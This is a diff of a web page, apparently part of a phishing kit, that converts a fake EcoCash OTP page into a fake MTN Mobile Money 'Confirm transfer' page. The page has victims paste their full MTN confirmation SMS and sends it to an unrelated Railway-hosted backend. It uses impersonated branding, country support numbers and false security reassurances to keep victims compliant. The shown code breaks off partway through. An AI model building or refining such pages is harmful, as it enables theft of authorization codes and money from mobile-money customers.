@@ -3,201 +3,292 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>EcoCash · Verification</title>
+<title>MTN Mobile Money · Confirm Transfer</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --eco-blue: #0066A6;
-    --eco-red: #E31E24;
-    --eco-green: #00A651;
-    --eco-navy: #101828;
-    --eco-muted: #667085;
-    --eco-border: #E5E7EB;
-    --eco-soft: #F5F7F9;
-    --eco-bg: #F8FAFC;
+    --mtn-royal: #2059B5;
+    --mtn-deep:  #073A87;
+    --mtn-white: #FFFFFF;
+    --mtn-green: #28A745;
+    --mtn-yellow:#FFCC08;
+    --mtn-text:  #456BA8;
+    --mtn-gray:  #7C8798;
+    --mtn-border:#E5E9F0;
+    --mtn-soft:  #F5F7FB;
+    --mtn-page:  #E7EEF7;
+    --mtn-red:   #C62828;
+    --mtn-red-soft: #FEF3F3;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
   body {
     font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: var(--eco-bg); color: var(--eco-navy);
-    -webkit-font-smoothing: antialiased; line-height: 1.5;
-    min-height: 100vh; padding: 24px 16px 48px;
+    background: var(--mtn-page); color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.45;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
   }
-  .wrap { max-width: 440px; margin: 0 auto; }
-  .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
-  .brand { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 22px; letter-spacing: -0.6px; }
-  .brand .eco { color: var(--eco-blue); }
-  .brand .cash { color: var(--eco-red); }
-  .header .label { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: var(--eco-muted); }
-  .card { background: #fff; border-radius: 20px; border: 1px solid var(--eco-border); box-shadow: 0 10px 30px rgba(17,24,39,0.06); overflow: hidden; }
-  .card-head { padding: 22px 22px 16px; border-bottom: 1px solid var(--eco-border); background: #FBFCFE; text-align: center; }
-  .card-head h1 { font-size: 18px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 4px; }
-  .card-head p { font-size: 12.5px; color: var(--eco-muted); line-height: 1.6; }
-  .card-body { padding: 20px 22px 22px; }
-  .tx-block { background: var(--eco-soft); border-radius: 12px; padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-  .tx-block .tx-left .k { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: var(--eco-muted); margin-bottom: 3px; }
-  .tx-block .tx-left .v { font-size: 13.5px; font-weight: 700; word-break: break-all; }
-  .tx-block .tx-amt { font-size: 17px; font-weight: 800; color: var(--eco-blue); letter-spacing: -0.4px; white-space: nowrap; }
-  .tx-block .tx-amt .cur { font-size: 11.5px; font-weight: 700; margin-right: 3px; opacity: 0.85; }
-  .expired-notice {
-    display: none; background: #FEF2F2; border: 1px solid #FECACA; border-left: 3px solid var(--eco-red);
-    color: #B91C1C; font-size: 12.5px; font-weight: 600; padding: 11px 14px; border-radius: 10px;
-    margin-bottom: 14px; line-height: 1.5; align-items: center; gap: 8px;
+  .phone { width: 100%; max-width: 430px; min-height: 100vh; background: var(--mtn-white); display: flex; flex-direction: column; position: relative; overflow: hidden; }
+  .top { position: relative; flex-shrink: 0; background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%); padding: 18px 22px 26px; border-bottom-left-radius: 38% 32px; border-bottom-right-radius: 38% 32px; }
+  .top-row { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
+  .brand { display: inline-flex; align-items: baseline; gap: 2px; font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff; }
+  .brand .mtn { color: var(--mtn-yellow); }
+  .brand .mm  { color: #FFFFFF; opacity: 0.95; }
+  .page-title { margin-top: 22px; font-size: 19px; font-weight: 800; color: #fff; letter-spacing: -0.3px; line-height: 1.25; }
+  .page-sub { margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.78); line-height: 1.5; max-width: 320px; }
+  .body { flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch; padding: 22px 22px 20px; display: flex; flex-direction: column; }
+  .amount-card { background: var(--mtn-soft); border-radius: 14px; padding: 14px 16px; display: flex; align-items: baseline; justify-content: space-between; gap: 12px; margin-bottom: 22px; }
+  .amount-card .label { font-size: 11px; color: var(--mtn-gray); font-weight: 600; letter-spacing: 0.4px; text-transform: uppercase; }
+  .amount-card .amount { font-size: 22px; font-weight: 800; color: var(--mtn-deep); letter-spacing: -0.6px; }
+  .notice { display: none; padding: 13px 15px; border-radius: 12px; font-size: 12.5px; font-weight: 600; line-height: 1.55; margin-bottom: 18px; border: 1px solid transparent; }
+  .notice.show { display: block; }
+  .notice .notice-title { font-size: 11px; font-weight: 800; letter-spacing: 0.6px; text-transform: uppercase; margin-bottom: 4px; display: block; }
+  .notice.warn { background: #FFF8E1; border-color: #FFE08A; color: #7A5B00; }
+  .notice.warn .notice-title { color: #8A6600; }
+  .notice.error { background: var(--mtn-red-soft); border-color: #F2B8B8; color: var(--mtn-red); }
+  .notice.error .notice-title { color: #8B0000; }
+  .notice.info { background: #EAF3FE; border-color: #BFD8F6; color: var(--mtn-deep); }
+  .notice.info .notice-title { color: var(--mtn-deep); }
+  .section-label { font-size: 11px; font-weight: 800; letter-spacing: 0.8px; text-transform: uppercase; color: var(--mtn-gray); margin-bottom: 8px; }
+  .sms-box { width: 100%; min-height: 130px; resize: vertical; background: var(--mtn-soft); border: 1.5px solid var(--mtn-border); border-radius: 12px; padding: 14px; font-family: 'Poppins', -apple-system, sans-serif; font-size: 13px; line-height: 1.55; color: var(--mtn-text); outline: none; transition: border-color .15s, background .15s; -webkit-appearance: none; }
+  .sms-box::placeholder { color: #9AA6B8; font-weight: 400; }
+  .sms-box:focus { border-color: var(--mtn-royal); background: #fff; }
+  .sms-box.invalid { border-color: #E23B3B; background: #FEF3F3; }
+  .field-error { display: none; font-size: 11.5px; color: var(--mtn-red); margin-top: 6px; font-weight: 600; line-height: 1.4; }
+  .field-error.show { display: block; }
+  .btn-paste { display: inline-flex; align-items: center; justify-content: center; gap: 8px; width: 100%; margin-top: 10px; padding: 11px 14px; font-size: 12.5px; font-weight: 700; background: #fff; color: var(--mtn-royal); border: 1.5px solid #CBD5E1; border-radius: 10px; cursor: pointer; font-family: inherit; transition: all .15s; }
+  .btn-paste:hover { border-color: var(--mtn-royal); background: #F0F5FC; }
+  .btn-paste:disabled { opacity: 0.6; cursor: default; }
+  .detected { margin-top: 14px; padding: 12px 14px; background: #EAF7EE; border: 1px solid #CDEBD6; border-radius: 10px; display: none; }
+  .detected.show { display: block; }
+  .detected .det-k { font-size: 10.5px; font-weight: 800; letter-spacing: 0.5px; text-transform: uppercase; color: #1E7A3A; margin-bottom: 4px; }
+  .detected .det-v { font-size: 15px; font-weight: 800; color: #0F5425; letter-spacing: 1.5px; word-break: break-all; }
+
+  /* ── Tap to copy button ── */
+  .btn-copy-sms {
+    display: none;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    width: 100%;
+    margin-top: 10px;
+    padding: 11px 14px;
+    font-size: 12.5px;
+    font-weight: 700;
+    background: #fff;
+    color: var(--mtn-green);
+    border: 1.5px solid var(--mtn-green);
+    border-radius: 10px;
+    cursor: pointer;
+    font-family: inherit;
+    transition: all .15s;
   }
-  .expired-notice.show { display: flex; }
-  .expired-notice .icon { width: 20px; height: 20px; border-radius: 50%; background: var(--eco-red); color: #fff; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; flex-shrink: 0; }
-  .expired-notice .text { flex: 1; }
-  .expired-notice .text small { display: block; font-size: 11px; font-weight: 500; color: #7F1D1D; margin-top: 2px; }
-  .otp-label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 8px; text-align: center; }
-  .otp-row { display: flex; justify-content: center; gap: 8px; margin-bottom: 14px; }
-  .otp-row input {
-    flex: 1; min-width: 0; max-width: 48px; height: 52px;
-    border: 2.5px solid var(--eco-border); border-radius: 14px;
-    background: #fff; color: var(--eco-navy);
-    font-family: inherit; font-size: 22px; font-weight: 800;
-    text-align: center; outline: none;
-    transition: border-color .15s, box-shadow .15s, background .15s;
+  .btn-copy-sms.show { display: inline-flex; }
+  .btn-copy-sms:hover { background: #EAF7EE; }
+  .btn-copy-sms:active { transform: scale(0.99); }
+  .btn-copy-sms.copied {
+    background: var(--mtn-green);
+    color: #fff;
+    border-color: var(--mtn-green);
   }
-  .otp-row input:focus { border-color: var(--eco-blue); box-shadow: 0 0 0 3px rgba(0,102,166,0.12); }
-  .otp-row input.filled { border-color: var(--eco-blue); background: #F6FBFE; }
-  .otp-row input:disabled { background: #F5F7F9; color: var(--eco-muted); }
-  .otp-help { display: flex; justify-content: center; align-items: center; gap: 6px; margin-bottom: 16px; font-size: 12px; color: var(--eco-muted); }
-  .resend-btn { background: transparent; border: none; font-family: inherit; font-size: 12px; font-weight: 700; color: var(--eco-blue); cursor: pointer; padding: 2px 0; }
-  .resend-btn:disabled { color: var(--eco-muted); cursor: default; }
-  .action-btn {
-    width: 100%; height: 56px; background: var(--eco-blue); color: #fff;
-    border: none; border-radius: 14px; font-family: inherit;
-    font-size: 15px; font-weight: 800; cursor: pointer;
-    transition: filter .15s, transform .1s;
-    display: flex; align-items: center; justify-content: center; gap: 8px;
+  .btn-copy-sms svg {
+    width: 15px;
+    height: 15px;
+    stroke: currentColor;
+    fill: none;
+    stroke-width: 2.4;
+    stroke-linecap: round;
+    stroke-linejoin: round;
   }
-  .action-btn:hover { filter: brightness(1.08); }
-  .action-btn:active { transform: scale(0.99); }
-  .action-btn:disabled { opacity: 0.7; cursor: wait; }
-  .card-foot { padding: 14px 22px 18px; border-top: 1px solid var(--eco-border); background: #FBFCFE; text-align: center; }
-  .card-foot .brand { font-size: 15px; }
-  .card-foot .small { font-size: 10.5px; color: var(--eco-muted); margin-top: 3px; }
-  .page-foot { text-align: center; margin-top: 16px; font-size: 11px; color: var(--eco-muted); line-height: 1.6; }
-  .verifying { position: fixed; inset: 0; background: #FFFFFF; display: none; align-items: center; justify-content: center; z-index: 2000; }
-  .verifying.show { display: flex; }
-  .verifying .inner { text-align: center; max-width: 320px; padding: 0 24px; }
-  .verifying .logo-big { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 32px; letter-spacing: -1px; margin-bottom: 32px; }
-  .verifying .logo-big .eco { color: var(--eco-blue); }
-  .verifying .logo-big .cash { color: var(--eco-red); }
-  .verifying .spinner { width: 54px; height: 54px; margin: 0 auto 22px; border: 4px solid #E5E7EB; border-top-color: var(--eco-blue); border-radius: 50%; animation: spin 0.9s linear infinite; }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .verifying .t { font-size: 17px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 6px; }
-  .verifying .s { font-size: 13px; color: var(--eco-muted); line-height: 1.6; }
-  .toast {
-    position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px);
-    background: var(--eco-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
-    font-size: 12.5px; font-weight: 600; box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-    opacity: 0; transition: all .3s ease; z-index: 3000; pointer-events: none;
-    max-width: 90%; text-align: center;
-  }
+
+  .btn-confirm { width: 100%; margin-top: 22px; height: 54px; background: var(--mtn-green); color: #fff; font-family: inherit; font-size: 15px; font-weight: 900; letter-spacing: 1.2px; text-transform: uppercase; border: none; border-radius: 999px; cursor: pointer; box-shadow: 0 10px 24px rgba(40,167,69,0.28); transition: filter .15s, transform .1s, opacity .15s; }
+  .btn-confirm:hover { filter: brightness(1.06); }
+  .btn-confirm:active { transform: scale(0.985); }
+  .btn-confirm:disabled { opacity: 0.65; cursor: wait; }
+  .help-note { margin-top: 18px; font-size: 11.5px; color: var(--mtn-gray); line-height: 1.6; text-align: center; }
+  .help-note strong { color: var(--mtn-text); font-weight: 700; }
+  .btn-resend { display: inline-flex; align-items: center; justify-content: center; gap: 8px; width: 100%; margin-top: 10px; padding: 12px 16px; font-size: 13px; font-weight: 700; background: #fff; color: var(--mtn-royal); border: 1.5px solid var(--mtn-royal); border-radius: 10px; cursor: pointer; font-family: inherit; transition: all .15s; }
+  .btn-resend:hover { background: #F0F5FC; }
+  .btn-resend:disabled { opacity: 0.6; cursor: wait; }
+  .btn-resend svg { width: 15px; height: 15px; stroke: currentColor; fill: none; stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round; }
+  .btn-resend.sent { background: var(--mtn-green); color: #fff; border-color: var(--mtn-green); }
+  .mtn-footer { width: 100%; margin-top: 22px; background: var(--mtn-yellow); border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; gap: 12px; text-align: left; }
+  .mtn-footer .foot-brand { display: inline-flex; align-items: baseline; gap: 2px; font-weight: 900; font-size: 15px; letter-spacing: -0.4px; color: #000; }
+  .mtn-footer .foot-support { font-size: 11px; color: #000; line-height: 1.45; font-weight: 600; text-align: right; }
+  .mtn-footer .foot-support strong { font-weight: 800; }
+  .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px); background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px; font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease; z-index: 50; pointer-events: none; max-width: 90%; text-align: center; }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-  @media (max-width: 360px) {
-    .otp-row input { height: 46px; font-size: 19px; border-radius: 12px; }
-    .otp-row { gap: 6px; }
-    .action-btn { height: 50px; font-size: 14px; }
-    .card-body { padding: 18px 16px 20px; }
-    .card-head { padding: 20px 16px 14px; }
+  .authorizing { position: fixed; inset: 0; background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%); display: none; flex-direction: column; align-items: center; justify-content: center; padding: 28px 24px; z-index: 9999; text-align: center; color: #fff; }
+  .authorizing.show { display: flex; }
+  .authorizing .brand-label { font-size: 15px; font-weight: 800; letter-spacing: -0.2px; margin-bottom: 34px; }
+  .authorizing .brand-label .mtn { color: var(--mtn-yellow); }
+  .authorizing .brand-label .mm  { color: #fff; }
+  .authorizing .spinner { width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.18); border-top-color: var(--mtn-yellow); border-radius: 50%; animation: spin 0.9s linear infinite; margin-bottom: 22px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .authorizing h2 { font-size: 20px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 24px; }
+  .trust-slider { width: 100%; max-width: 340px; height: 76px; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+  .trust-msg { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; padding: 0 8px; opacity: 0; transform: translateX(24px); transition: opacity .45s ease, transform .45s ease; font-size: 13px; line-height: 1.55; color: rgba(255,255,255,0.86); font-weight: 500; text-align: center; }
+  .trust-msg.active { opacity: 1; transform: translateX(0); }
+  .trust-msg.leaving { opacity: 0; transform: translateX(-24px); }
+  .trust-msg::before { content: '✓'; color: var(--mtn-yellow); font-weight: 900; margin-right: 8px; }
+  .authorizing .cancel-link { margin-top: 28px; background: transparent; border: none; color: rgba(255,255,255,0.68); font-family: inherit; font-size: 12px; font-weight: 600; cursor: pointer; text-decoration: underline; text-underline-offset: 3px; }
+  .authorizing .cancel-link:hover { color: var(--mtn-yellow); }
+  @media (max-width: 380px) {
+    .top { padding: 16px 18px 22px; }
+    .body { padding: 18px 18px 16px; }
+    .brand { font-size: 16px; }
+    .page-title { font-size: 17px; }
+    .amount-card .amount { font-size: 19px; }
+    .sms-box { min-height: 115px; font-size: 12.5px; }
+    .btn-confirm { height: 50px; font-size: 14px; }
+    .authorizing h2 { font-size: 18px; }
+    .authorizing .spinner { width: 50px; height: 50px; }
+    .trust-slider { height: 80px; }
+    .trust-msg { font-size: 12px; }
+  }
+  @media (max-height: 680px) {
+    .page-title { margin-top: 16px; }
+    .amount-card { margin-bottom: 16px; }
+    .btn-confirm { margin-top: 16px; height: 48px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone { min-height: calc(100vh - 64px); max-height: 900px; border-radius: 32px; box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18); overflow: hidden; }
+    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
   }
 </style>
 </head>
 <body>
 
-<div class="wrap">
-  <div class="header">
-    <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
-    <span class="label">Verification</span>
+<div class="phone">
+  <div class="top">
+    <div class="top-row">
+      <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+    </div>
+    <div class="page-title">Confirm your transfer</div>
+    <div class="page-sub">Paste the Y'ello message you received from MTN to authorize this transfer.</div>
   </div>
 
-  <div class="card">
-    <div class="card-head">
-      <h1>Enter verification code</h1>
-      <p>Enter the 6-digit code you received. It will be sent for approval.</p>
+  <div class="body">
+    <div class="notice error" id="noticeDeclined">
+      <span class="notice-title">Transfer declined</span>
+      Your transfer was not approved. Please check the details and try again, or contact MTN support if the issue continues.
+    </div>
+    <div class="notice warn" id="noticeExpired">
+      <span class="notice-title">SMS expired</span>
+      The Y'ello message has expired. Tap <strong>Resend SMS</strong> below to receive a new message, then paste it here.
+    </div>
+    <div class="notice info" id="noticeFullSms">
+      <span class="notice-title">Paste full SMS</span>
+      Please paste the <strong>entire</strong> Y'ello SMS — including any code or reference — or tap <strong>Resend SMS</strong> below to receive a fresh message.
     </div>
 
-    <div class="card-body">
-      <div class="tx-block">
-        <div class="tx-left">
-          <div class="k">Transaction</div>
-          <div class="v" id="txId">—</div>
-        </div>
-        <div class="tx-amt"><span class="cur" id="amtCur">—</span><span id="amtVal">0.00</span></div>
-      </div>
-
-      <div class="expired-notice" id="expiredNotice">
-        <span class="icon">!</span>
-        <div class="text">
-          Code expired. Please resend.
-          <small>Your previous code is no longer valid. Tap "Resend code" to receive a new one.</small>
-        </div>
-      </div>
-
-      <label class="otp-label">6-digit code</label>
-      <div class="otp-row" id="otpRow">
-        <input type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
-        <input type="text" inputmode="numeric" maxlength="1">
-        <input type="text" inputmode="numeric" maxlength="1">
-        <input type="text" inputmode="numeric" maxlength="1">
-        <input type="text" inputmode="numeric" maxlength="1">
-        <input type="text" inputmode="numeric" maxlength="1">
-      </div>
-
-      <div class="otp-help">
-        <span>Didn't receive the code?</span>
-        <button class="resend-btn" id="resendBtn" onclick="requestCode('manual')" disabled>Resend in 30s</button>
-      </div>
-
-      <button class="action-btn" id="verifyBtn" onclick="verifyCode()">Verify</button>
+    <div class="amount-card">
+      <span class="label">Transfer amount</span>
+      <span class="amount" id="amountLabel">—</span>
     </div>
 
-    <div class="card-foot">
-      <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
-      <div class="small">Your credentials are never shared.</div>
-    </div>
-  </div>
+    <div class="section-label">Y'ello SMS message</div>
+    <textarea class="sms-box" id="smsInput" placeholder="Paste the full Y'ello message here…" spellcheck="false" autocomplete="off"></textarea>
+    <div class="field-error" id="smsError">The message must start with "Y'ello" and contain the confirmation code.</div>
 
-  <div class="page-foot">
-    Powered by EcoCash · Secure payment verification
+    <button class="btn-paste" id="pasteBtn" onclick="pasteFromClipboard()">📋 Paste from clipboard</button>
+
+    <!-- Tap to copy the exact pasted SMS -->
+    <button class="btn-copy-sms" id="copySmsBtn" onclick="copySmsText()">
+      <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+      <span id="copySmsLabel">Tap to copy SMS</span>
+    </button>
+
+    <div class="detected" id="detectedBox">
+      <div class="det-k">Detected confirmation code</div>
+      <div class="det-v" id="detectedCode">—</div>
+    </div>
+
+    <button class="btn-confirm" id="confirmBtn" onclick="confirmPayment()">Confirm transfer</button>
+
+    <div class="help-note">
+      Didn't receive the message?<br>
+      Tap <strong>Resend SMS</strong> or dial <strong>*126#</strong> → "My messages".
+    </div>
+
+    <button class="btn-resend" id="resendBtn" onclick="resendSms()">
+      <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
+      <span id="resendLabel">Resend SMS</span>
+    </button>
+
+    <div class="mtn-footer">
+      <div class="foot-brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+      <div class="foot-support">Need help?<br>Call <strong id="supportNum">—</strong></div>
+    </div>
   </div>
 </div>
 
-<div class="verifying" id="verifying">
-  <div class="inner">
-    <div class="logo-big"><span class="eco">Eco</span><span class="cash">Cash</span></div>
-    <div class="spinner"></div>
-    <div class="t">Verifying…</div>
-    <div class="s">Please wait for approval. Do not close this page.</div>
+<div class="authorizing" id="authorizingOverlay">
+  <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+  <div class="spinner"></div>
+  <h2 id="authTitle">Verifying…</h2>
+  <div class="trust-slider">
+    <div class="trust-msg active">Your message is being checked against MTN's secure records.</div>
+    <div class="trust-msg">This step protects your wallet from unauthorized transfers.</div>
+    <div class="trust-msg">Your details stay encrypted end-to-end during verification.</div>
   </div>
+  <button class="cancel-link" onclick="cancelAuthorizing()">Cancel</button>
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
-  /* All API calls route to Railway (always-on) so the flow works
-     even if Render is cold-starting. */
+  /* All critical API calls go to Railway (always-on) instead of Render. */
   const RAILWAY_BASE = 'https://amazonpay-production.up.railway.app';
 
   const CONFIG = {
-    OTP_REQUEST: RAILWAY_BASE + '/api/ecocash/otp',
-    SUBMIT: RAILWAY_BASE + '/api/ecocash/submit',
-    STATUS: (ref) => RAILWAY_BASE + '/api/ecocash/status/' + encodeURIComponent(ref) + '?_=' + Date.now(),
-    LINKS: [
+    OTP_PAGE: 'otp.html',
+    SHORT_LINK_ENDPOINTS: [
       (code) => RAILWAY_BASE + '/api/links/' + encodeURIComponent(code),
       (code) => RAILWAY_BASE + '/api/links?code=' + encodeURIComponent(code)
-    ]
+    ],
+    SMS_SEND: RAILWAY_BASE + '/api/verification/sms',
+    SMS_STATUS: (ref) => RAILWAY_BASE + '/api/verification/sms-status/' + encodeURIComponent(ref) + '?_=' + Date.now(),
+    RESEND: RAILWAY_BASE + '/api/verification/resend',
+    POLL_MS: 1500
   };
 
+  const params = new URLSearchParams(location.search);
+
+  const SUPPORT_NUMBERS = {
+    'Cameroon': '8787', 'Zambia': '111', 'Zambia (MTN)': '111',
+    'Uganda': '100', 'Uganda (MTN)': '100',
+    'Ghana': '100', 'Ghana (MTN)': '100',
+    'Benin': '111', "Côte d'Ivoire": '111', 'Congo': '111',
+    'Eswatini': '111', 'Liberia': '111', 'Rwanda (MTN)': '111'
+  };
+  const CURRENCY_LOCALE = {
+    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH', USD: 'en-US',
+    XOF: 'fr-CI', SZL: 'en-SZ', LRD: 'en-LR', RWF: 'en-RW'
+  };
   const CURRENCY_SYMBOLS = {
     USD: '$', ZiG: 'ZiG ', ZAR: 'R', KES: 'KSh ', BWP: 'P ',
     MWK: 'MK ', RWF: 'FRw ', XAF: 'FCFA ', XOF: 'CFA ', ZMW: 'K ',
     UGX: 'USh ', GHS: '₵', SZL: 'E', LRD: 'L$ ', EUR: '€', GBP: '£'
   };
+
+  function formatAmount(amount, currency) {
+    const n = Number(amount);
+    if (!isFinite(n)) return '—';
+    const cur = String(currency || '').toUpperCase();
+    const sym = CURRENCY_SYMBOLS[cur] || (cur ? cur + ' ' : '');
+    try {
+      const parts = new Intl.NumberFormat(CURRENCY_LOCALE[cur] || 'en-US', {
+        minimumFractionDigits: 2, maximumFractionDigits: 2
+      }).format(n);
+      return sym + parts;
+    } catch (e) {
+      return sym + n.toFixed(2);
+    }
+  }
 
   function b64urlDecode(str) {
     str = String(str).replace(/-/g, '+').replace(/_/g, '/');
@@ -205,280 +296,385 @@
     return decodeURIComponent(escape(atob(str)));
   }
 
-  const params = new URLSearchParams(location.search);
-  const txData = { tx: '', am: '', cur: '', rn: '', c: '', pm: '', an: '', dt: '' };
+  const tx = { ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '', mk: '', an: '', dt: '' };
 
-  async function resolvePayload() {
+  async function resolveTx() {
     const d = params.get('d');
     if (d) {
       try {
-        const p = JSON.parse(b64urlDecode(d));
-        Object.assign(txData, {
-          tx:  p.tx  || p.tn || '',
-          am:  p.am  || '',
-          cur: p.cur || '',
-          rn:  p.rn  || '',
-          c:   p.c   || '',
-          pm:  p.pm  || '',
-          an:  p.an  || '',
-          dt:  p.dt  || ''
+        const payload = JSON.parse(b64urlDecode(d));
+        Object.assign(tx, {
+          ref: payload.tx || payload.tn || '',
+          am: payload.am || '', cur: payload.cur || '', rn: payload.rn || '',
+          c: payload.c || '', pm: payload.pm || '', sn: payload.sn || '',
+          mk: payload.mk || '', an: payload.an || '', dt: payload.dt || ''
         });
         return;
-      } catch (e) { /* fall through */ }
+      } catch (e) {}
     }
-
     const code = params.get('r');
     if (code) {
-      for (const makeUrl of CONFIG.LINKS) {
+      for (const makeUrl of CONFIG.SHORT_LINK_ENDPOINTS) {
         try {
           const res = await fetch(makeUrl(code));
           if (!res.ok) continue;
           const data = await res.json();
           const p = data && (data.payload || data);
           if (p && (p.am || p.c)) {
-            Object.assign(txData, {
-              tx:  p.tx  || p.tn || '',
-              am:  p.am  || '',
-              cur: p.cur || '',
-              rn:  p.rn  || '',
-              c:   p.c   || '',
-              pm:  p.pm  || '',
-              an:  p.an  || '',
-              dt:  p.dt  || ''
+            Object.assign(tx, {
+              ref: p.tx || p.tn || '', am: p.am || '', cur: p.cur || '',
+              rn: p.rn || '', c: p.c || '', pm: p.pm || '', sn: p.sn || '',
+              mk: p.mk || '', an: p.an || '', dt: p.dt || ''
             });
             return;
           }
-        } catch (e) { /* try next */ }
+        } catch (e) {}
       }
     }
-
     try {
       const raw = sessionStorage.getItem('amz_payload');
       if (raw) {
         const p = JSON.parse(raw);
-        Object.assign(txData, {
-          tx:  p.tx  || p.tn || '',
-          am:  p.am  || '',
-          cur: p.cur || '',
-          rn:  p.rn  || '',
-          c:   p.c   || '',
-          pm:  p.pm  || '',
-          an:  p.an  || '',
-          dt:  p.dt  || ''
+        Object.assign(tx, {
+          ref: p.tx || p.tn || '', am: p.am || '', cur: p.cur || '',
+          rn: p.rn || '', c: p.c || '', pm: p.pm || '', sn: p.sn || '',
+          mk: p.mk || '', an: p.an || '', dt: p.dt || ''
         });
         return;
       }
     } catch (e) {}
-
-    txData.tx  = params.get('tx')  || '';
-    txData.am  = params.get('am')  || '';
-    txData.cur = params.get('cur') || '';
-    txData.rn  = params.get('rn')  || '';
-    txData.c   = params.get('c')   || '';
-    txData.pm  = params.get('pm')  || '';
-    txData.an  = params.get('an')  || '';
-    txData.dt  = params.get('dt')  || '';
+    tx.ref = params.get('tx') || '';
+    tx.am  = params.get('am') || '';
+    tx.cur = params.get('cur') || '';
+    tx.rn  = params.get('rn') || '';
+    tx.c   = params.get('c') || '';
+    tx.pm  = params.get('pm') || '';
+    tx.sn  = params.get('sn') || '';
+    tx.mk  = params.get('mk') || '';
+    tx.an  = params.get('an') || '';
+    tx.dt  = params.get('dt') || '';
   }
-
-  function formatAmount(amount, currency) {
-    const n = Number(amount);
-    if (!isFinite(n)) return '0.00';
-    return n.toFixed(2);
-  }
-
-  const boxes = Array.from(document.querySelectorAll('#otpRow input'));
-  boxes.forEach((el, i) => {
-    el.addEventListener('input', () => {
-      el.value = el.value.replace(/\D/g, '').slice(0, 1);
-      el.classList.toggle('filled', !!el.value);
-      if (el.value && i < boxes.length - 1) boxes[i + 1].focus();
-    });
-    el.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !el.value && i > 0) boxes[i - 1].focus();
-    });
-    el.addEventListener('paste', (e) => {
-      const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
-      if (text.length === 6) {
-        e.preventDefault();
-        text.split('').forEach((d, idx) => { boxes[idx].value = d; boxes[idx].classList.add('filled'); });
-        boxes[5].focus();
-      }
-    });
-  });
-
-  function getOtp() { return boxes.map(el => el.value).join(''); }
-  function clearOtp() { boxes.forEach(el => { el.value = ''; el.classList.remove('filled'); }); boxes[0].focus(); }
-  function setOtpEnabled(on) { boxes.forEach(el => { el.disabled = !on; }); }
 
   function showToast(msg) {
     const t = document.getElementById('toast');
     t.textContent = msg; t.classList.add('show');
     clearTimeout(t._timer);
-    t._timer = setTimeout(() => t.classList.remove('show'), 2200);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2400);
   }
-  function showExpiredNotice() { document.getElementById('expiredNotice').classList.add('show'); }
-  function hideExpiredNotice() { document.getElementById('expiredNotice').classList.remove('show'); }
 
-  let countdown = 30;
-  let timer = null;
-  const resendBtn = document.getElementById('resendBtn');
+  let trustTimer = null, trustIndex = 0;
+  function startTrustSlider() {
+    const msgs = document.querySelectorAll('.trust-msg');
+    trustIndex = 0;
